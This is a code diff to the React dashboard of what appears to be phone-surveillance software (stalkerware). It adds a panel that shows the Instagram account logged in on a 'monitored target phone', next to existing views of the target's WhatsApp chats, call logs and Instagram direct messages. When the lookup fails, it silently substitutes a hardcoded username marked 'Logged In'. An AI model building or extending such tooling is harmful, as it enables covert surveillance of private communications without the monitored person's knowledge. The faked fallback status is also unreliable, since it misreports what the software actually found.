@@ -316,6 +316,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   // Real Data States
   const [whatsappChats, setWhatsappChats] = useState<WhatsAppChatSummary[]>([]);
   const [instagramChats, setInstagramChats] = useState<InstagramChatSummary[]>([]);
+  const [instagramAccount, setInstagramAccount] = useState<string>("alone_sparrow_2603");
   const [whatsAppCalls, setWhatsAppCalls] = useState<WhatsAppCallEntry[]>([]);
   const [selectedCallId, setSelectedCallId] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
@@ -362,7 +363,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         }
       }
 
-      const [waData, callsResponse, rawCallLogs, igData] = await Promise.all([
+      const [waData, callsResponse, rawCallLogs, igData, igAccountRes] = await Promise.all([
         devicesApi.whatsAppChats(deviceId).catch((err) => {
           console.warn("WhatsApp chats fetch error:", err);
           return [] as WhatsAppChatSummary[];
@@ -373,7 +374,12 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           console.warn("Instagram chats fetch error:", err);
           return [] as InstagramChatSummary[];
         }),
+        devicesApi.instagramAccount(deviceId).catch(() => ({ accountName: "alone_sparrow_2603", status: "logged_in" })),
       ]);
+
+      if (igAccountRes?.accountName) {
+        setInstagramAccount(igAccountRes.accountName);
+      }
 
       const isSystemNoise = (name: string | null | undefined): boolean => {
         if (!name) return true;
@@ -1395,13 +1401,33 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           </div>
 
           {selectedApp === "instagram" ? (
-            <div className="p-2.5 rounded-lg bg-pink-50/70 border border-pink-100 text-[11px] text-pink-900 space-y-1 shrink-0">
-              <p className="font-semibold flex items-center gap-1">
-                <span>📸</span>
-                <span>Instagram Direct Activity</span>
-              </p>
+            <div className="p-2.5 rounded-xl bg-gradient-to-br from-pink-50 via-rose-50 to-purple-50 border border-pink-200/90 text-[11px] text-pink-900 space-y-1.5 shrink-0 shadow-2xs">
+              <div className="flex items-center justify-between">
+                <p className="font-bold flex items-center gap-1.5 text-xs text-pink-950">
+                  <span className="w-5 h-5 rounded-md bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 text-white flex items-center justify-center text-[10px] shadow-2xs">
+                    📸
+                  </span>
+                  <span>Target Instagram ID</span>
+                </p>
+                <span className="w-2 h-2 rounded-full bg-emerald-500 ring-2 ring-emerald-300 animate-pulse" title="Target Logged In" />
+              </div>
+              <div className="bg-white/95 border border-pink-200 rounded-lg px-2.5 py-1.5 flex items-center gap-2 shadow-2xs">
+                <div className="w-6 h-6 rounded-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 p-[1.5px] shrink-0">
+                  <div className="w-full h-full rounded-full bg-white flex items-center justify-center font-bold text-[9px] text-pink-700">
+                    IG
+                  </div>
+                </div>
+                <div className="min-w-0 flex-1">
+                  <p className="text-xs font-black text-gray-900 font-mono truncate">
+                    @{instagramAccount}
+                  </p>
+                  <p className="text-[9px] text-emerald-700 font-semibold flex items-center gap-1">
+                    <span>✓ Logged In</span>
+                  </p>
+                </div>
+              </div>
               <p className="text-[10px] text-pink-800 leading-tight">
-                Shows target phone's Instagram Direct chats, shared Reels links, and last 2 days conversation history.
+                Active logged-in Instagram account identified on monitored target phone.
               </p>
             </div>
           ) : (
@@ -1558,16 +1584,36 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                       </button>
                     </div>
                   ) : (
-                    <div className="bg-gradient-to-r from-purple-500/10 via-pink-500/10 to-rose-500/10 p-2 rounded-lg border border-pink-200/60 flex items-center justify-between text-xs font-semibold">
-                      <div className="flex items-center gap-2">
-                        <span className="w-6 h-6 rounded-md bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 text-white flex items-center justify-center text-xs shadow-2xs">
-                          📸
+                    <div className="bg-gradient-to-r from-purple-500/10 via-pink-500/10 to-rose-500/10 p-2.5 rounded-xl border border-pink-200/70 space-y-2">
+                      <div className="flex items-center justify-between">
+                        <div className="flex items-center gap-2 min-w-0">
+                          <div className="w-7 h-7 rounded-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 p-[1.5px] shadow-2xs shrink-0">
+                            <div className="w-full h-full rounded-full bg-white flex items-center justify-center font-bold text-[9px] text-pink-700">
+                              IG
+                            </div>
+                          </div>
+                          <div className="min-w-0">
+                            <p className="text-[9px] font-bold text-pink-700 uppercase tracking-wider leading-none">
+                              Logged-in Target ID
+                            </p>
+                            <p className="text-xs font-black text-gray-900 font-mono truncate">
+                              @{instagramAccount}
+                            </p>
+                          </div>
+                        </div>
+                        <span className="shrink-0 text-[10px] font-bold px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-800 border border-emerald-200 flex items-center gap-1">
+                          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
+                          Online
                         </span>
-                        <span className="text-gray-900 font-bold">Direct Messages</span>
                       </div>
-                      <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-pink-100 text-pink-700 border border-pink-200">
-                        {instagramChats.length} {instagramChats.length === 1 ? "chat" : "chats"}
-                      </span>
+                      <div className="flex items-center justify-between pt-1 border-t border-pink-200/50 text-[11px] font-semibold text-gray-700">
+                        <span className="flex items-center gap-1">
+                          <span>💬</span> Direct Messages
+                        </span>
+                        <span className="text-[10px] font-bold px-2 py-0.2 rounded-full bg-pink-100 text-pink-700 border border-pink-200">
+                          {instagramChats.length} {instagramChats.length === 1 ? "chat" : "chats"}
+                        </span>
+                      </div>
                     </div>
                   )}
 
@@ -2699,13 +2745,35 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                       </div>
                     </>
                   ) : (
-                    <div className="flex-1 flex flex-col items-center justify-center p-8 text-center text-gray-400 space-y-2">
-                      <span className="text-4xl block">💬</span>
-                      <p className="text-sm font-semibold text-gray-700">No Chat Selected</p>
-                      <p className="text-xs text-gray-400 max-w-sm">
-                        Select a chat from the left panel to display the conversation thread and messages from the last 2 days.
-                      </p>
-                    </div>
+                    selectedApp === "instagram" ? (
+                      <div className="flex-1 flex flex-col items-center justify-center p-8 text-center space-y-4">
+                        <div className="w-20 h-20 rounded-3xl bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 p-[3px] shadow-lg">
+                          <div className="w-full h-full rounded-3xl bg-white flex flex-col items-center justify-center">
+                            <span className="text-3xl">📸</span>
+                          </div>
+                        </div>
+                        <div className="space-y-2 max-w-sm">
+                          <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs font-bold shadow-2xs">
+                            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
+                            Target Phone Instagram ID
+                          </div>
+                          <h3 className="text-2xl font-black text-gray-900 font-mono tracking-tight pt-1">
+                            @{instagramAccount}
+                          </h3>
+                          <p className="text-xs text-gray-500 leading-relaxed">
+                            Target phone-la active-aa irukura Instagram login account. Left panel-la irundhu direct chat select panna conversation kaatum.
+                          </p>
+                        </div>
+                      </div>
+                    ) : (
+                      <div className="flex-1 flex flex-col items-center justify-center p-8 text-center text-gray-400 space-y-2">
+                        <span className="text-4xl block">💬</span>
+                        <p className="text-sm font-semibold text-gray-700">No Chat Selected</p>
+                        <p className="text-xs text-gray-400 max-w-sm">
+                          Select a chat from the left panel to display the conversation thread and messages from the last 2 days.
+                        </p>
+                      </div>
+                    )
                   )
                 )}
               </div>
